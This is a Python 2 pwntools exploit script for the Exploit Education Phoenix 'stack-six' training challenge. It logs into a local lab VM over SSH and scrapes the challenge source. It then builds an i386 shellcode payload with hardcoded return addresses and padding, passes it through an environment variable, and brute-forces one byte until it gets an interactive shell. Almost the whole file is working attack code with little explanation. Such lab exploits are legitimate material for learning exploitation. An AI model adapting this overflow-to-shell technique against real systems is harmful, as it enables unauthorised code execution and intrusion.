__author__ = '@tomereyz'
from pwn import *
import requests
from bs4 import BeautifulSoup

context.clear(arch='i386')

"""
export ExploitEducation=`python -c "from pwn import *; shell_code = asm(shellcraft.i386.sh()); 
payload = pack(0x8049942, word_size=32) + shell_code; print payload + cyclic(122 - len(payload)) + pack(0x8049930 +
 4 + 14, word_size=32) + '\x14'` ; gdb stack-six -x a.sh
"""


def main(download):
    localhost = 'localhost'
    user_name = 'root'
    challenge_name = 'stack-six'
    challenge_port = 2222

    ssh_client = ssh(user=user_name, host=localhost, password=user_name, port=challenge_port)
    if download:
        ssh_client.download('/opt/phoenix/i486/{}'.format(challenge_name))
        resp = requests.get('https://exploit.education/phoenix/{challenge_name}/'.format(challenge_name=challenge_name))
        bs_obj = BeautifulSoup(resp.content, 'html.parser')
        with open('{challenge_name}.c'.format(challenge_name=challenge_name), 'w') as f:
            f.write(bs_obj.find_all('code', {'class': 'language-c'})[0].text)

    shell_code = asm(shellcraft.i386.sh())
    payload = pack(0x8049942, word_size=32) + shell_code

    for c in xrange(1, 255):
        r = ssh_client.process(executable='/opt/phoenix/i486/{}'.format(challenge_name),
                               env={'ExploitEducation': payload + cyclic(122 - len(payload)) + pack(0x8049930 + 4 + 14,
                                                                                                    word_size=32) + chr(
                                   c)})

        try:
            r.recvline()
            r.recvline()
            r.sendline('pwd')
            resp = r.recvline()
            if resp:
                print resp, hex(c)
                r.interactive()
        except:
            pass


if __name__ == '__main__':
    main(download=True)
